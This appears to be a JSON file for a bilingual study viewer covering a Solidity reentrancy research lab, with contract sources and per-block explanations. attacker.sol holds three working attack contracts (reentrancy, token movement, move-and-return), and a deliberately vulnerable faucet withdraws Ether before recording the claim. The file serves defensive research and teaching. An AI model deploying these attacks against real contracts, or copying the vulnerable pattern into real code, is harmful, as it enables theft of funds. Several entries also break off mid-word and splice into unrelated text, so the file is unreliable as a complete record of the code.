ck behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiment 2","rose":[],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null}],"tags":[],"jp":{"title":"getBalanceヘルパー","purpose":"contract自身のEther残高を返し、unit testのassertionや結果確認に使う補助関数。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"授業 helper pattern","experiments":"Experiment 2"}}],"role_ja":"Cross-contract補助 / 2人目のclaimant"},{"group":"contracts","name":"AdaptiveFaucet.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"./SentinelToken.sol\";\n\ncontract AdaptiveFaucet {\n    SentinelToken public token;\n    mapping(address => bool) public claimed;\n    mapping(address => bool) public banned;\n\n    bool private locked;\n    bool public learnedPassMove;\n    uint256 public threatCount;\n    uint256 public totalTrips;\n\n    constructor(address _tokenAddress) payable {\n        token = SentinelToken(payable(_tokenAddress));\n    }\n\n    modifier noReentrant() {\n        require(\n            !locked,\n            \"Mutex: Reentrant call blocked\"\n        );\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    // 標準防御を行い、Tripwireの結果を記憶する。\n    function withdraw(uint withdraw_amt)\n        public\n        noReentrant\n    {\n        require(withdraw_amt <= 0.1 ether);\n        require(!banned[msg.sender], \"banned\");\n        require(token.balances(msg.sender) > 0, \"no pass\");\n        require(!claimed[msg.sender], \"already claimed\");\n\n        try this.guardedWithdraw(msg.sender, withdraw_amt) {\n        } catch Error(string memory reason) {\n            if (keccak256(bytes(reason)) != keccak256(bytes(\"TRIPWIRE_PASS_MOVED\"))) {\n                revert(reason);\n            }\n\n            totalTrips++;\n            threatCount++;\n            learnedPassMove = true;\n            banned[msg.sender] = true;\n            token.setAdaptiveRestriction(true);\n        }\n    }\n\n    // 支払い中のPASS移動を観察し、移動があれば内側だけrevertする。\n    function guardedWithdraw(address payer, uint withdraw_amt) external {\n        require(msg.sender == address(this), \"internal only\");\n\n        token.beginPayment();\n        uint256 movesBefore = token.movesSincePaymentStart();\n\n        claimed[payer] = true;\n\n        (bool success, ) =\n            payable(payer).call{\n                value: withdraw_amt\n            }(\"\");\n\n        require(\n            success,\n            \"Withdrawal failed\"\n        );\n\n        uint256 movesAfter = token.movesSincePaymentStart();\n\n        if (movesAfter > movesBefore) {\n            revert(\"TRIPWIRE_PASS_MOVED\");\n        }\n\n        token.endPayment();\n    }\n\n    receive() external payable {}\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n","role":"Core two-layer defense: prevent → observe → revert → remember → adapt","priority":"HIGH","lesson":"2026-06-20 mutex + L12 try/catch + research logic","blocks":[{"id":"AdaptiveFaucet.sol:1-4","start":1,"end":4,"title":"Header + token import","purpose":"Compiler metadata and SentinelToken dependency.","priority":"LOW","lesson":"Project composition / Solidity foundation","confidence":"高","origin":"General Solidity","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","ex constructor pattern","experiments":"Experiments 1–6"}},{"id":"AdaptiveFaucet.sol:20-29","start":20,"end":29,"title":"Layer 1 mutex modifier","purpose":"Uses the classroom noReentrant lock around outer withdraw execution.","priority":"HIGH","lesson":"Reentrancy/mutex lab around 2026-06-20","confidence":"確定","origin":"Direct classroom pattern","required":"Required for normal reentrancy baseline defense before Layer 2.","remove":"Removing it makes Adaptive Faucet fail the Experiment 1 Layer 1 expectation.","rename":"noReentrant and locked are user-defined; modifier/_/require are fixed constructs.","experiments":"Experiments 1–6","rose":["Why keep a mutex if the Tripwire exists?","Where does `_` insert the withdraw body?"],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null},{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null}],"tags":[],"jp":{"title":"Layer 1 mutex modifier","purpose":"このまとまり全体で「Layer 1 mutex modifier」という一つの役割を達成する。日本語モードでは学習用要約、Englishモードでは元の詳細説明を表示する。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Reentrancy/mutex lab around 2026-06-20","experiments":"Experiments 1–6"}},{"id":"AdaptiveFaucet.sol:31-40","start":31,"end":40,"title":"Outer withdraw — Layer 1 checks","purpose":"Applies amount cap, ban, PASS entitlement and claimed checks before opening the risky inner frame.","priority":"HIGH","lesson":"CEI/mutex baseline + research policy","confidenc ason filter avoids treating unrelated failures as attacks.","remove":"Calling guardedWithdraw internally would not create the same catchable external frame; catching every error as a threat could misclassify ordinary failures.","rename":"try/catch/Error/string/keccak256/bytes/revert/this are fixed constructs; guardedWithdraw/reason are user-defined.","experiments":"Experiments 2, 3, 5, 6","rose":["Why `this.guardedWithdraw` rather than `guardedWithdraw`?","What exactly gets rolled back by the inner revert?","Why compare hashes of reason strings?","Why rethrow a non-Tripwire reason?"],"sources":[{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null},{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null}],"tags":[],"jp":{"title":"外側try/catch — 別call frame + reason選別","purpose":"this.guardedWithdraw(...) を外部self-callとして実行し、内側だけをrevert可能にする。catchではTripwire専用reasonだけを学習対象にし、それ以外のErrorは再revertする。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"L12 try/catch + research inner/outer frame design","experiments":"Experiments 2, 3, 5, 6"}},{"id":"AdaptiveFaucet.sol:47-53","start":47,"end":53,"title":"Threat Memory + adaptation write","purpose":"After catching the known Tripwire reason, persists trip counters, learned flag, attacker ban, and enables the token restriction.","priority":"HIGH","lesson":"Research-specific remember → adapt step","confidence":"確定","origin":"Research-only contribution","required":"This is the outer-frame memory that survives because the harmful inner frame has already reverted separately.","remove":"Without it the first attack would be undone but no future b iscussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null}],"tags":[],"jp":{"title":"receive — Ether受取","purpose":"空calldataのEtherを受け取ったときに動くreceive関数。ここでは資金受取またはattacker callbackの入口になる。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Solidity receive / Faucet pattern","experiments":"Experiments 1–6"}},{"id":"AdaptiveFaucet.sol:85-87","start":85,"end":87,"title":"getBalance helper","purpose":"Returns Faucet Ether balance for evidence and assertions.","priority":"LOW","lesson":"Course helper pattern","confidence":"高","origin":"Classroom helper","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiments 1–6","rose":[],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null}],"tags":[],"jp":{"title":"getBalanceヘルパー","purpose":"contract自身のEther残高を返し、unit testのassertionや結果確認に使う補助関数。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"授業 helper pattern","experiments":"Experiments 1–6"}}],"role_ja":"2層防御の中核: prevent → observe → revert → remember → adapt"},{"group":"contracts","name":"attacker.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"./IFaucet.sol\";\nimport \"./SentinelToken.sol\";\nimport \"./Accomplice.sol\";\n\ncontract FaucetAttacker {\n    IFaucet public faucet;\n\n    uint public attackAmount = 0.1 ether;\n    uint public gasUsed;\n    uint public cycleCount = 0;\n\n    constructor(address _faucetAddress) {\n        faucet = IFaucet(_faucetAddress);\n    }\n\n    // Normal Reentrancyを開始する。\n    function attack() external {\n        faucet.withdraw(attackAmount);\n    }\n\n    // Ether受領時に同じwithdrawへ再入する。\n    receive() external payable {\n        cycleCount++;\n\n        uint gasAtStart = gasleft();\n\n        if (\n            address(faucet).balance >= attackAmount &&\n            gasleft() > 100000\n        ) {\n            try faucet.withdraw(attackAmount) {\n            } catch {\n            }\n        }\n\n        uint gasAtEnd = gasleft();\n        uint gasUsedThisCycle = gasAtStart - gasAtEnd;\n        gasUsed += gasUsedThisCycle;\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract TokenMoveAttacker {\n    IFaucet public faucet;\n    SentinelToken public token;\n    address public immutable accomplice;\n    uint public attackAmount = 0.1 ether;\n    bool public passMoveBlocked;\n\n    constructor(\n        address _faucetAddress,\n        address _tokenAddress,\n        address _accomplice\n    ) {\n        faucet = IFaucet(_faucetAddress);\n        token = SentinelToken(payable(_tokenAddress));\n        accomplice = _accomplice;\n    }\n\n    // Cross-Contract Token Movementを開始する。\n    function attack() external {\n        passMoveBlocked = false;\n        faucet.withdraw(attackAmount);\n    }\n\n    // Ether受領中にPASSをAccompliceへ移す。\n    receive() external payable {\n        uint256 bal = token.balances(address(this));\n\n        if (bal > 0) {\n            bool moved = token.transfer(accomplice, bal);\n\n            if (!moved) {\n                passMoveBlocked = true;\n            }\n        }\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract MoveReturnAttacker {\n    IFaucet public faucet;\n    SentinelToken public token;\n    address public immutable accomplice;\n    uint public attackAmount = 0.1 ether;\n\n    constructor(\n        address _faucetAddress,\n        address _tokenAddress,\n        address _accomplice\n    ) {\n        faucet = IFaucet(_faucetAddress);\n        token = SentinelToken(payable(_tokenAddress));\n        accomplice = _accomplice;\n    }\n\n    // Move-and-Returnを開始する。\n    function attack() external {\n        faucet.withdraw(attackAmount);\n    }\n\n    // PASSを移動し、同じcallback中に元へ戻す。\n    receive() external payable {\n        uint256 bal = token.balances(address(this));\n\n        if (bal > 0) {\n            bool moved = token.transfer(accomplice, bal);\n\n            if (moved) {\n                Accomplice(payable(accomplice)).returnPass(address(this));\n            }\n        }\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n","role":"Three attacker variants: normal reentry, token movement, move-return","priority":"HIGH","lesson":"2026-06-20 attacker + L12 + research","blocks":[{"id":"attacker.sol:1-6","start":1,"end":6,"title":"Header + attack dependencies","purpose":"Imports the target interface, PASS token and Accomplice helper.","priority":"LOW","lesson":"2026-06-20 attacker + L12 ClaimToken","confidence":"高","origin":"Classroom patterns + research extensions","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"","rose":[],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null},{"label":"Lec laimed[msg.sender], \"already claimed\");\n\n        (bool success, ) = payable(msg.sender).call{value: withdraw_amt}(\"\");\n        require(success, \"Withdrawal failed\");\n\n        claimed[msg.sender] = true;\n    }\n\n    receive() external payable {}\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n","role":"Deliberately vulnerable baseline Faucet","priority":"HIGH","lesson":"2026-06-20 reentrancy baseline","blocks":[{"id":"faucet3-vulnerable.sol:1-4","start":1,"end":4,"title":"Header + token import","purpose":"Compiler metadata plus the SentinelToken dependency.","priority":"LOW","lesson":"Solidity foundation + project composition","confidence":"高","origin":"Course pattern adapted to token-gated Faucet","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"","rose":[],"sources":[{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"},{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null}],"tags":[],"jp":{"title":"ヘッダー + token import","purpose":"コンパイラ条件と、このファイルが依存するcontract/interfaceを読み込むための冒頭部分。通常コメントとconsole出力はStudy Viewでは非表示。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Solidity foundation + project composition","experiments":"—"}},{"id":"faucet3-vulnerable.sol:6-8","start":6,"end":8,"title":"Vulnerable Faucet state","purpose":"Stores the token contract and per-address claimed state.","priority":"HIGH","lesson":"Reentrancy baseline / L12 shared-state pattern","confidenc eive / course faucet pattern","experiments":"Experiments 1, 2, 6"}},{"id":"faucet3-vulnerable.sol:28-30","start":28,"end":30,"title":"getBalance helper","purpose":"Returns the Faucet contract Ether balance for tests and console output.","priority":"LOW","lesson":"Reentrancy lab helper pattern","confidence":"高","origin":"Direct classroom helper pattern","required":"Required by current test code, though not by the Faucet’s core payment logic.","remove":"Removing it makes current tests fail to compile until they are rewritten to inspect `address(faucet).balance`.","rename":"getBalance is user-defined; public/view/returns/address(this).balance are language constructs.","experiments":"Experiments 1, 2, 6","rose":["Why is this view rather than pure?","Is this security logic or observability/test support?"],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null},{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"getBalanceヘルパー","purpose":"contract自身のEther残高を返し、unit testのassertionや結果確認に使う補助関数。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Reentrancy lab helper pattern","experiments":"Experiments 1, 2, 6"}}],"role_ja":"意図的にCEIを破ったVulnerable baseline"},{"group":"contracts","name":"Faucet3Mutex.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"./SentinelToken.sol\";\n\ncontract Faucet3Mutex {\n    SentinelToken public token;\n    mapping(address => bool) public claimed;\n    bool private locked;\n\n    constructor(address _tokenAddress) payable {\n        token = SentinelToken(payable(_tokenAddress));\n    }\n\n    modifier noReentrant() {\n        require(\n            !locked,\n            \"Mutex: Reentrant call blocked\"\n        );\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    // CEIとmutexでwithdrawを保護する。\n    function withdraw(uint withdraw_amt)\n        public\n        noReentrant\n    {\n        require(withdraw_amt <= 0.1 ether);\n        require(token.balances(msg.sender) > 0, \"no pass\");\n        require(!claimed[msg.sender], \"already claimed\");\n\n        claimed[msg.sender] = true;\n\n        (bool success, ) =\n            payable(msg.sender).call{\n                value: withdraw_amt\n            }(\"\");\n\n        require(\n            success,\n            \"Withdrawal failed\"\n        );\n    }\n\n    receive() external payable {}\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n","role":"Standard CEI + mutex control Faucet","priority":"HIGH","lesson":"2026-06-20 mutex defense","blocks":[{"id":"Faucet3Mutex.sol:1-4","start":1,"end":4,"title":"Header + token import","purpose":"Compiler metadata and token dependency.","priority":"LOW","lesson":"Course foundation","confidence":"高","origin":"General Solidity + project composition","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"","rose":[],"sources":[{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"},{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null} cense-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\ninterface IERC20Light {\n    function transfer(address to, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n","role":"Minimal transfer/event interface","priority":"LOW","lesson":"L12 ClaimToken","blocks":[{"id":"IERC20Light.sol:1-2","start":1,"end":2,"title":"License + compiler range","purpose":"Declares the file license identifier and accepted Solidity compiler range.","priority":"LOW","lesson":"Early Solidity foundation","confidence":"推定","origin":"General Solidity","required":"The pragma is required to compile under an accepted compiler; the SPDX comment is metadata rather than runtime logic.","remove":"Removing pragma changes compiler-version constraints; removing SPDX does not change runtime behavior.","rename":"`pragma`, `solidity` and version syntax are fixed; version numbers are chosen by the author.","experiments":"","rose":[],"sources":[{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"ライセンス + コンパイラ範囲","purpose":"コンパイラ条件と、このファイルが依存するcontract/interfaceを読み込むための冒頭部分。通常コメントとconsole出力はStudy Viewでは非表示。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Early Solidity foundation","experiments":"—"}},{"id":"IERC20Light.sol:4-7","start":4,"end":7,"title":"Minimal token interface","purpose":"Defines the transfer function signature and Transfer event shape used as the lightweight ERC-20-like contract surface.","priority":"MEDIUM","lesson":"Lecture 12 ClaimToken","confidence":"確定","origin":"Direct classroom pattern","required":"`transfer(...)` is required because SentinelToken declares `is IERC20Light`; the event declaration is not used by the six tests.","remove":"Removing transfer breaks interface implementation. Removing the event declaration does not change the current experiment behavior.","rename":"`interface`, `function`, `external`, `returns`, `event`, `indexed` are fixed syntax; IERC20Light, transfer, parameter names and event name are user-defined/API names.","experiments":"All experiments through SentinelToken","rose":["Why can an interface declare a function without a body?","Does declaring Transfer force SentinelToken.transfer() to emit it?","Which names here are Solidity keywords and which could be renamed consistently?"],"sources":[{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null},{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"最小トークンinterface","purpose":"この研究で必要なtransfer署名とTransfer eventだけを定義する軽量interface。実装本体ではなく「呼び出せる形」を宣言する。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Lecture 12 ClaimToken","experiments":"All experiments through SentinelToken"}}],"role_ja":"軽量ERC-20風interface"},{"group":"contracts","name":"IFaucet.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\ninterface IFaucet {\n    function withdraw(uint _withdrawAmount) external;\n}\n","role":"Minimal Faucet attack-surface interface","priority":"MEDIUM","lesson":"2026-06-20 attacker pattern","blocks":[{"id":"IFaucet.sol:1-2","start":1,"end":2,"title":"License + compiler range","purpose":"File metadata and compiler compatibility.","priority":"LOW","lesson":"Early Solidity foundation","confidence":"推定","origin":"General Solidity","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"","rose":[],"sources":[{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"ライセンス + コンパイラ範囲","purpose":"コンパイラ条件と、このファイルが依存するcontract/interfaceを読み込むための冒頭部分。通常コメントとconsole出力はStudy Viewでは非表示。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Early Solidity foundation","experiments":"—"}},{"id":"IFaucet.sol:4-6","start":4,"end":6,"title":"Faucet attack-surface interface","purpose":"Gives attacker/accomplice contracts the minimal model needed to call `withdraw(uint)`.","priority":"HIGH","lesson":"Reentrancy / attacker lab around 2026-06-20","confidence":"高","origin":"Direct classroom pattern","required":"Required by attacker.sol and Accomplice.sol as their target type.","remove":"Removing it breaks imports/type checking unless callers are rewritten.","rename":"IFaucet and `_withdrawAmount` are renameable with references updated; `withdraw` is an API name and could only be renamed if every implementation/caller changes.","experiments":"Experiments 1–6","rose":["Why does the attacker need only an interface rather than the whole Faucet source?","Why is `withdraw` external in an interface?"],"sources":[{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null},{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"Faucet攻撃面interface","purpose":"Attacker/AccompliceがFaucetのwithdraw(uint)だけを知れば呼べるようにする最小interface。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Reentrancy / attacker lab around 2026-06-20","experiments":"Experiments 1–6"}}],"role_ja":"Attacker用の最小Faucet interface"},{"group":"contracts","name":"SentinelToken.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"./IERC20Light.sol\";\n\ncontract SentinelToken is IERC20Light {\n    mapping(address => uint256) public balances;\n\n    address public owner;\n    address public faucet;\n\n    bool public paymentActive;\n    uint256 public paymentTransferCount;\n    uint256 private transferCountAtStart;\n\n    bool public adaptiveRestriction;\n    uint256 public earlyPreventions;\n\n    constructor(address[] memory holders, uint256[] memory amounts) payable {\n        owner = msg.sender;\n\n        for (uint256 i = 0; i < holders.length; i++) {\n            balances[holders[i]] = amounts[i];\n        }\n    }\n\n    // Adaptive Faucetを一度だけ登録する。\n    function setFaucet(address _faucet) external {\n        require(msg.sender == owner, \"not owner\");\n        require(faucet == address(0), \"already set\");\n        faucet = _faucet;\n    }\n\n    // PASSを移動し、支払い中の移動を数える。\n    function transfer(address to, uint256 amount) external returns (bool) {\n        if (paymentActive && adaptiveRestriction) {\n            earlyPreventions++;\n            return false;\n        }\n\n        if (paymentActive) {\n            paymentTransferCount++;\n        }\n\n        require(balances[msg.sender] >= amount, \"transfer: Insufficient balance\");\n        balances[msg.sender] -= amount;\n        balances[to] += amount;\n        return true;\n    }\n\n    // 支払い中の監視を開始する。\n    function beginPayment() external {\n        require(msg.sender == faucet, \"not faucet\");\n        paymentActive = true;\n        transferCountAtStart = paymentTransferCount;\n    }\n\n    // 支払い中の監視を終了する。\n    function endPayment() external {\n        require(msg.sender == faucet, \"not faucet\");\n        paymentActive = false;\n    }\n\n    // 今回の支払い中に起きたPASS移動数を返す。\n    function movesSincePaymentStart() external view returns (uint256) {\n        return paymentTransferCount - transferCountAtStart;\n    }\n\n    // 学習後の早期防御を有効にする。\n    function setAdaptiveRestriction(bool enabled) external {\n        require(msg.sender == faucet, \"not faucet\");\n        adaptiveRestriction = enabled;\n    }\n\n    receive() external payable {}\n}\n","role":"PASS token plus payment-window movement monitoring and learned restriction","priority":"HIGH","lesson":"L12 ClaimToken + research logic","blocks":[{"id":"SentinelToken.sol:1-4","start":1,"end":4,"title":"Header + IERC20Light import","purpose":"Compiler metadata and minimal token interface dependency.","priority":"LOW","lesson":"Lecture 12 ClaimToken","confidence":"高","origin":"Classroom interface base","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"","rose":[],"sources":[{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null},{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"ヘッダー + IERC20Light import","purpose":"コンパイラ条件と、このファイルが依存するcontract/interface er — 学習済み早期防御ゲート","purpose":"支払い中かつ学習済みrestrictionが有効なら、残高を書き換える前にtransferをfalseで止め、earlyPreventionsを増やす。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"研究固有 Adaptive Sentinel","experiments":"Experiments 3, 5, 6"}},{"id":"SentinelToken.sol:41-49","start":41,"end":49,"title":"transfer — movement history + normal balance move","purpose":"Counts any transfer during the payment window, then performs the classroom-style balance check/subtract/add and returns true.","priority":"HIGH","lesson":"Lecture 12 ClaimToken + research movement counter","confidence":"確定","origin":"Classroom transfer base with research counter","required":"The normal transfer logic is required for PASS movement; the counter is required to expose temporary move-return behavior.","remove":"Removing the counter makes move-return harder to detect; removing balance checks permits invalid transfers.","rename":"to and amount are user-defined parameter names; transfer signature follows IERC20Light.","experiments":"Experiments 2, 5","rose":["Why increment before the balance move?","How does two-way move-return affect paymentTransferCount?","Why can final balances look unchanged while the Tripwire still fires?"],"sources":[{"label":"Lecture 12 ClaimToken — exact source pack","internal":"l12_claimtoken_snippets/","url":null},{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null}],"tags":[],"jp":{"title":"transfer — 移動履歴 + 通常残高移動","purpose":"支払い中のtransfer回数を単調増加で記録してから、残高チェック→減算→加算の通常PASS移動を行う。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Lecture 12 ClaimToken + research movement counter","experiments":"Experiments 2, 5"}},{"id":"SentinelToken.sol:51-56","start":51,"end":56,"title":"beginPayment — open observation window","purpose":"Only the registered Faucet can mark payment active and snapshot the cumulative movement counter.","priority":"HIGH","lesson":"Research-specific Adaptive Sentinel","confidence":"確定","origin":"Research-only addition","required":"Required to define exactly which 